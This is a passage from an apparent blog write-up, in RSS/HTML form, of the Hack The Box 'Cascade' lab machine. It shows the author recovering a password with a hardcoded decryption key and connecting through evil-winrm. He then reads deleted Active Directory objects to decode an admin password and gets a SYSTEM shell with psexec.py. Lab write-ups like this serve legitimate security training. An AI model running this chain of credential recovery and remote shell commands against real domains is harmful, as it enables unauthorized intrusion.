					<span class="k">using</span> <span class="p">(</span><span class="n">SQLiteDataReader</span> <span class="n">sqliteDataReader</span> <span class="p">=</span> <span class="n">sqliteCommand</span><span class="p">.</span><span class="n">ExecuteReader</span><span class="p">())</span>
					<span class="p">{</span>
						<span class="n">sqliteDataReader</span><span class="p">.</span><span class="n">Read</span><span class="p">();</span>
						<span class="n">str</span> <span class="p">=</span> <span class="n">Conversions</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="n">sqliteDataReader</span><span class="p">[</span><span class="s">&#34;Uname&#34;</span><span class="p">]);</span>
						<span class="n">str2</span> <span class="p">=</span> <span class="n">Conversions</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="n">sqliteDataReader</span><span class="p">[</span><span class="s">&#34;Domain&#34;</span><span class="p">]);</span>
						<span class="kt">string</span> <span class="n">encryptedString</span> <span class="p">=</span> <span class="n">Conversions</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="n">sqliteDataReader</span><span class="p">[</span><span class="s">&#34;Pwd&#34;</span><span class="p">]);</span>
						<span class="k">try</span>
						<span class="p">{</span>
							<span class="n">password</span> <span class="p">=</span> <span class="n">Crypto</span><span class="p">.</span><span class="n">DecryptString</span><span class="p">(</span><span class="n">encryptedString</span><span class="p">,</span> <span class="s">&#34;c4scadek3y654321&#34;</span><span class="p">);</span>
						<span class="p">}</span>
<span class="p">...&lt;</span><span class="n">snip</span><span class="p">&gt;...</span>
</code></pre></div><p>The interesting part in the code above is, of course, the password decrypt line. Now because I only need the decrypt function, I could remove all the codes and put only this line below on the main function and then print it out using <code>Console.Write()</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="n">password</span> <span class="p">=</span> <span class="n">Crypto</span><span class="p">.</span><span class="n">DecryptString</span><span class="p">(</span><span class="n">encryptedString</span><span class="p">,</span> <span class="s">&#34;c4scadek3y654321&#34;</span><span class="p">);</span>
</code></pre></div><h4 id="decrypt-password">Decrypt Password</h4>
<p>First, I&rsquo;ll enter edit mode on the current main function</p>
<p><div class="img-container"><img src="imgs/image-20210423235935774.png" alt="image-20210423235935774"  /></div>
</p>
<p>Then, I could only use the decrypt function in the main function. So the main function code now looks like this.</p>
<p><div class="img-container"><img src="imgs/image-20210424000216346.png" alt="image-20210424000216346"  /></div>
</p>
<p>I&rsquo;ll save it as a new program called <code>CascAuditModified.exe</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210424000500081.png" alt="image-20210424000500081"  /></div>
</p>
<p>Now if I run it, I get the decrypted password.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">┌─「iamf@MSI」 ‣ 「/mnt/z/Shared/Audit$」 ᓚᘏᗢ <span class="o">[</span>172.17.146.164<span class="o">]</span>
└─╼$ ./CascAuditModified.exe
w3lc0meFr31nd
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210424000707924.png" alt="image-20210424000707924"  /></div>
</p>
<h4 id="remote-access---arksvc">Remote Access - Arksvc</h4>
<p>From my RPC enumeration, ArkSvc is a member of Remote Management Users, so I can use it with <code>evil-winrm</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «Data» «192.168.43.234»
$ evil-winrm -i cascade.htb -u arksvc -p <span class="s1">&#39;w3lc0meFr31nd&#39;</span>

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>rksvc<span class="se">\D</span>ocuments&gt;
</code></pre></div><h3 id="shell-as-nt-authoritysystem">Shell as NT Authority\System</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>I&rsquo;ll wrap it up:</p>
<p>First, recall from RPC enumeration that user <code>ArkSvc</code> is also a member of AD Recycle Bin. The AD Recycle Bin group gives you permission to read deleted AD objects.</p>
<p>Second, according to the email sent by Steve Smith, there is a temporary admin account called <code>TempAdmin</code> that uses the same password as the &ldquo;normal&rdquo; admin account.</p>
<p><div class="img-container"><img src="imgs/image-20210424003416214.png" alt="image-20210424003416214"  /></div>
</p>
<p>But, based on <code>ArkAdRecycleBin.log</code>, <code>TempAdmin</code> has been moved into AD Recycle Bin.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">...&lt;snip&gt;...
8/12/2018 12:22 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
8/12/2018 12:22 [MAIN_THREAD]   Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
8/12/2018 12:22 [MAIN_THREAD]   Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
8/12/2018 12:22 [MAIN_THREAD]   Exiting with error code 0
</code></pre></div><p>And now using <code>ArksSvc</code> account, I can search all the deleted objects using the command below:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="p">*</span><span class="nb">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">arksvc</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="nb">Get-ADObject</span> <span class="n">-filter</span> <span class="s1">&#39;isDeleted -eq $true&#39;</span> <span class="n">-includeDeletedObjects</span> <span class="n">-Properties</span> <span class="p">*</span> <span class="n">-includeDeletedObjects</span> <span class="n">-SearchBase</span> <span class="s2">&#34;DC=cascade,DC=local&#34;</span>
</code></pre></div><p>After looking through the output, I noticed that <code>TempAdmin</code> has one interesting properties. It is another <code>cascadeLegacyPwd</code>.</p>
<p><img src="imgs/image-20210424004624882.png" alt="image-20210424004624882" style="zoom:80%;" /></p>
<p>I can decode the value to plaintext</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «Data» «192.168.43.234»
$ <span class="nb">echo</span> <span class="s1">&#39;YmFDVDNyMWFOMDBkbGVz&#39;</span> <span class="p">|</span> base64 -d
baCT3r1aN00dles
</code></pre></div><p><code>TempAdmin:baCT3r1aN00dles</code></p>
<h4 id="remote-access---nt-authoritysystem">Remote Access - NT Authority\System</h4>
<p>The password works on the Administrator account, and I can obtain an interactive shell as NT Authority\System using <code>psexec.py</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «Data» «192.168.43.234»
$ psexec.py cascade.local/administrator:<span class="s1">&#39;baCT3r1aN00dles&#39;</span>@cascade.htb
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210424005142127.png" alt="image-20210424005142127"  /></div>
</p>
<hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges#ad-recycle-bin">https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges#ad-recycle-bin</a></li>
</ul>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
